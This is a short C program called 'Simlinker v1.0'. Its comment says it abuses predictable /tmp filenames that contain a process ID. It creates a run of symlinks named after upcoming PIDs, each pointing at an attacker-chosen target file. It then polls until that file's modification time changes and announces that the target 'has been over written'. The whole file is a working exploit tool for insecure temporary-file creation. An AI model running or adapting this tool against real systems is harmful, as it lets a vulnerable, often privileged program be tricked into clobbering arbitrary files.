#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>


/*symlink creator to abuse files creation in /tmp where the pid is used
in the filename.
First we need to take arguments that consist of a range of numbers
and a filename to link from and a filename to link to.

Add monitoring of writes to linked files?
*/

extern int errno;

int
main (int argc, char **argv)
{

  int x = 0, from = 0, to = 0, result = 0, i = 0;
  char dest_name[256];
  char from_name[256];
  struct stat buf;
  time_t t_time_watch, t_time;
  char start_time[26];


  from = getpid ();
  if (argc == 1)
    {

      printf ("Simlinker v1.0 \n");
      printf
	("Usage: %s number of symlinks starting from my pid:%d from_file to_file\n",
	 argv[0], from);
      return (0);
    }

  to = atoi (argv[1]);
  to = from + to;

  printf ("Starting from our own process id: %d\n", from);

  snprintf (dest_name, 256, "%s", argv[3]);
  i = stat (dest_name, &buf);
  if (i < 0)
    {
      printf ("ERROR with stat() on %s", dest_name);
      return (-1);
    }

  t_time = buf.st_mtim.tv_sec;
  snprintf (start_time, 25, "%s", ctime (&t_time));

  t_time_watch = buf.st_mtim.tv_sec;
  for (x = from; x <= to; x++)
    {
      sprintf (from_name, "/tmp/%s%d", argv[2], x);
      printf ("Symlinking %s->%s\n", from_name, dest_name);
      result = symlink (dest_name, from_name);

      if (result < 0)
	{

	  printf ("Error: %d, %s\n", result, strerror (errno));
	  return (-1);
	}

    }

  while (t_time == t_time_watch)
    {

      i = stat (dest_name, &buf);
      t_time_watch = buf.st_mtim.tv_sec;

    }

  if (t_time != t_time_watch)
    {

      printf ("[+] The target file %s has been over written!\n", dest_name);
      printf ("[+] Modification time changed from %s to %s\n", start_time,
	      ctime (&t_time_watch));

    }

  return (0);
}
